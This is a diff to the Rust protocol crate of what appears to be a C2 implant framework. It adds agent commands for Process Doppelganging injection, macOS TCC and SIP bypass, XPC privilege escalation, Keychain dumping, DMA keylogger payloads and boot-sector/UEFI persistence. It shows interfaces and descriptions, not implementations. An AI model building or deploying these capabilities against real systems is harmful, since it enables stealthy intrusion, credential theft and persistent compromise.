@@ -37,6 +37,8 @@ pub mod forward_secrecy;
 pub mod hkdf_info;
 /// Indicator-of-compromise detection and reporting.
 pub mod ioc;
+/// Poison-resilient Mutex / RwLock helpers.
+pub mod lock;
 /// Malleable C2 profile types shared between agent and server.
 pub mod malleable_types;
 /// Transport-layer normalization (Base64, Mask XOR, Netbios encoding).
@@ -913,6 +915,25 @@ pub enum Command {
         etw_blinding: bool,
     },
 
+    /// Process Doppelganging injection via NTFS transactions.
+    ///
+    /// Creates an NTFS transaction, writes the payload into a transacted
+    /// temp file, creates a section from the file, rolls back the
+    /// transaction (deleting the file from disk), then maps the section
+    /// into a suspended process and executes the payload.  No disk
+    /// artifacts remain after rollback.
+    ///
+    /// This is the raw NT-level implementation — it does not go through
+    /// the injection engine's technique-selection or fallback chain.
+    /// Returns `InjectionResult` on success.
+    ProcessDoppelganging {
+        /// Process name to use as the sacrificial host (e.g. `"svchost.exe"`).
+        /// If `None`, defaults to `svchost.exe`.
+        target_process: Option<String>,
+        /// Shellcode or PE payload bytes.
+        payload: Vec<u8>,
+    },
+
     /// Delayed module-stomp injection: load a sacrificial DLL into the
     /// target process, wait for the EDR initial-scan window to pass,
     /// then overwrite the DLL's `.text` section with the payload.
@@ -1472,8 +1493,223 @@ pub enum Command {
         description: String,
         /// Location/path of the artifact.
         path: String,
-        /// Risk level.
+        /// Risk level (e.g. "info", "low", "medium", "high", "critical").
         risk_level: String,
+        /// Whether the artifact can be safely removed.
+        removable: bool,
+    },
+
+    // ── Anti-Debug Hardening (macOS) ────────────────────────────────────────
+
+    /// Actively deny future debugger attachment on macOS by calling
+    /// `ptrace(PT_DENY_ATTACH)`.  This is a non-passive side-effect that
+    /// prevents any subsequent debugger from attaching.  On non-macOS
+    /// platforms this is a no-op that always succeeds.
+    DenyDebuggerAttach,
+
+    // ── macOS Post-Exploitation: TCC ────────────────────────────────────────
+
+    /// Check TCC (Transparency, Consent, and Control) permission status for
+    /// the current process on macOS.  Queries the system and user TCC
+    /// databases for the specified resource.
+    ///
+    /// **Resource** is one of: `Camera`, `Microphone`, `ScreenRecording`,
+    /// `FullDiskAccess`, `DesktopFolder`, `DocumentsFolder`, `DownloadsFolder`,
+    /// `Contacts`, `Calendar`, `Reminders`, `Photos`, `Accessibility`,
+    /// `PostEvent`.
+    ///
+    /// Returns JSON with `resource`, `status` (Allowed/Denied/NotDetermined/
+    /// Unknown), and `source` (where the status was read from).
+    ///
+    /// macOS-only, gated by `macos-postexp` feature flag.
+    MacTccCheck {
+        /// TCC resource name (e.g. "FullDiskAccess", "Camera").
+        resource: String,
+    },
+
+    /// Attempt TCC bypass on macOS.  Multiple bypass methods are available:
+    ///
+    /// - `database` — Write directly to the TCC SQLite database (requires
+    ///   root + SIP disabled).
+    /// - `synthetic_click` — Generate synthetic mouse clicks on the TCC
+    ///   permission dialog (requires Accessibility permission).
+    /// - `vulnerable_process` — Exploit a process that already has the
+    ///   required TCC permission.
+    /// - `all` — Try all methods in order and return the first success.
+    ///
+    /// Returns JSON with `success`, `technique`, and `message`.
+    ///
+    /// macOS-only, gated by `macos-postexp` feature flag.
+    MacTccBypass {
+        /// TCC resource name (e.g. "FullDiskAccess", "Camera").
+        resource: String,
+        /// Bypass method: "database", "synthetic_click", "vulnerable_process",
+        /// or "all".
+        method: String,
+    },
+
+    // ── macOS Post-Exploitation: SIP ────────────────────────────────────────
+
+    /// Check System Integrity Protection (SIP) status on macOS.
+    /// Returns JSON with `status` (Enabled/Disabled/PartiallyDisabled/Unknown),
+    /// `csrutil_output`, and `nvram_config`.
+    ///
+    /// macOS-only, gated by `macos-postexp` feature flag.
+    MacSipStatus,
+
+    /// Attempt SIP bypass via mount on macOS.  Mounts a synthetic filesystem
+    /// over a protected path to bypass SIP file restrictions.  Requires root.
+    ///
+    /// Returns `true` on success.
+    ///
+    /// macOS-only, gated by `macos-postexp` feature flag.
+    MacSipBypassMount,
+
+    // ── macOS Post-Exploitation: XPC ────────────────────────────────────────
+
+    /// Enumerate XPC services on macOS that may be exploitable for privilege
+    /// escalation.  Returns a JSON array of service objects with `name`,
+    /// `mach_service_name`, `executable_path`, `bundle_path`, and `is_privileged`.
+    ///
+    /// macOS-only, gated by `macos-postexp` feature flag.
+    MacXpcEnumerate,
+
+    /// Attempt XPC-based privilege escalation on macOS by connecting to a
+    /// privileged XPC service and sending a crafted message.
+    ///
+    /// Returns JSON with `service_name`, `success`, `technique`, and `message`.
+    ///
+    /// macOS-only, gated by `macos-postexp` feature flag.
+    MacXpcExploit {
+        /// XPC service name to target (from `MacXpcEnumerate` results).
+        service_name: String,
+    },
+
+    // ── macOS Post-Exploitation: Keychain ────────────────────────────────────
+
+    /// Dump macOS Keychain entries using the `security` CLI.
+    /// Returns a JSON array of keychain entries with `service`, `account`,
+    /// `password` (if accessible), `entry_type`, `label`, and dates.
+    ///
+    /// **Requirements**: Full Disk Access or unlocked Keychain.  Root can
+    /// access the system Keychain without additional permissions.
+    ///
+    /// macOS-only, gated by `macos-postexp` feature flag.
+    MacKeychainDump,
+
+    // ── Hardware Persistence: Thunderbolt / DMA ─────────────────────────────
+
+    /// Detect Thunderbolt controller on the host.  Returns `null` if no
+    /// controller found, otherwise JSON with `generation`, `security_level`,
+    /// `firmware_version`, and `domains` information.
+    ///
+    /// Cross-platform (Linux and Windows), gated by `hardware-persistence`
+    /// feature flag.
+    HwDetectThunderbolt,
+
+    /// Check DMA (Direct Memory Access) vulnerability on the host.  Probes
+    /// Thunderbolt security configuration, IOMMU/VT-d status, and known
+    /// vulnerable controller firmware.
+    ///
+    /// Returns JSON with `vulnerable` (bool), `factors` (array of contributing
+    /// factors), `attack_vectors` (array of available attack vectors), and
+    /// `risk_score` (0–100).
+    ///
+    /// Cross-platform (Linux and Windows), gated by `hardware-persistence`
+    /// feature flag.
+    HwCheckDmaVulnerability,
+
+    /// Prepare a DMA payload for Thunderbolt-based attacks.  Generates a
+    /// binary payload that can be loaded onto a DMA-capable device (e.g.,
+    /// PCILeech-compatible hardware).
+    ///
+    /// **Payload types**: `PhysRead` (physical memory read), `PhysWrite`
+    /// (physical memory write), `Kexec` (kernel code execution), `Keylogger`
+    /// (keystroke capture via DMA).
+    ///
+    /// Returns JSON with base64-encoded `payload_data`, `architecture`,
+    /// `payload_type`, and `size_bytes`.
+    ///
+    /// Cross-platform (Linux and Windows), gated by `hardware-persistence`
+    /// feature flag.
+    HwPrepareDmaPayload {
+        /// Payload type: "PhysRead", "PhysWrite", "Kexec", or "Keylogger".
+        payload_type: String,
+    },
+
+    /// Read physical memory via DMA at the specified address.
+    /// Requires a DMA-capable device or BYOVD driver.
+    ///
+    /// Returns base64-encoded bytes read from physical memory.
+    ///
+    /// Cross-platform (Linux and Windows), gated by `hardware-persistence`
+    /// feature flag.
+    HwDmaReadPhysical {
+        /// Physical memory address to read from.
+        addr: u64,
+        /// Number of bytes to read.
+        size: u32,
+    },
+
+    // ── Hardware Persistence: Boot ──────────────────────────────────────────
+
+    /// Check whether the system boots via Legacy BIOS or UEFI mode.
+    /// Returns JSON with `mode` ("Uefi" or "LegacyBios"), `secure_boot`
+    /// status (UEFI only), and `description`.
+    ///
+    /// Cross-platform (Linux and Windows), gated by `hardware-persistence`
+    /// feature flag.
+    HwBootMode,
+
+    /// Install VBR (Volume Boot Record) persistence for Legacy BIOS systems.
+    /// Writes a payload to the boot sector that executes before the OS loads.
+    ///
+    /// **DANGEROUS**: Can brick the system if the payload is incorrect.
+    /// A backup of the original boot sector is created before modification.
+    ///
+    /// Cross-platform (Linux and Windows), gated by `hardware-persistence`
+    /// feature flag.
+    HwInstallVbrPersistence {
+        /// Path to the payload binary to install in the boot sector.
+        payload_path: String,
+    },
+
+    /// Install UEFI boot driver persistence.  Writes an EFI driver to the
+    /// ESP and registers it in the UEFI boot sequence.
+    ///
+    /// **DANGEROUS**: Writing incorrect EFI drivers can brick the firmware.
+    /// A backup is created before modification.
+    ///
+    /// Cross-platform (Linux and Windows), gated by `hardware-persistence`
+    /// feature flag.
+    HwInstallUefiBootPersistence {
+        /// Path to the EFI driver binary to install.
+        driver_path: String,
+    },
+
+    /// Detect existing hardware-level persistence artifacts on the system.
+    /// Scans boot sectors, ESP files, NVRAM variables, and bootloader
+    /// configurations for signs of compromise.
+    ///
+    /// Returns a JSON array of detected artifacts with `artifact_type`,
+    /// `description`, `path`, `risk_level`, and `removable` fields.
+    ///
+    /// Cross-platform (Linux and Windows), gated by `hardware-persistence`
+    /// feature flag.
+    HwDetectPersistence,
+
+    /// Remove a detected hardware persistence artifact.
+    /// Creates a backup before removal.
+    ///
+    /// Cross-platform (Linux and Windows), gated by `hardware-persistence`
+    /// feature flag.
+    HwRemovePersistence {
+        /// Artifact type (e.g. "VbrModification", "EfiBootEntry", "UnsignedUefiDriver").
+        artifact_type: String,
+        /// Human-readable description.
+        description: String,
+        /// Location of the artifact (path, LBA, or NVRAM entry).
+        location: String,
         /// Whether the artifact can be safely removed.
         removable: bool,
     },
@@ -1814,7 +2050,10 @@ pub fn secure_zero(slice: &mut [u8]) {
     for byte in slice.iter_mut() {
         unsafe { std::ptr::write_volatile(byte, 0) };
     }
-    std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
+    // Full CPU fence (not compiler_fence) so the barrier is effective on
+    // ARM64's weak memory model — prevents CPU reordering of the volatile
+    // zeroing past this point.
+    std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);
 }
 
 /// Zeroize a `String` in place by overwriting its heap buffer with zeros.
@@ -2351,8 +2590,8 @@ mod tests {
             },
             operator_id: None,
         };
-        let bytes = bincode::serialize(&msg).unwrap();
-        let back: Message = bincode::deserialize(&bytes).unwrap();
+        let bytes = bincode::serde::encode_to_vec(&msg, bincode::config::legacy()).unwrap();
+        let back: Message = bincode::serde::decode_from_slice(&bytes, bincode::config::legacy()).map(|(v, _)| v).unwrap();
         match back {
             Message::TaskRequest {
                 task_id, command, ..
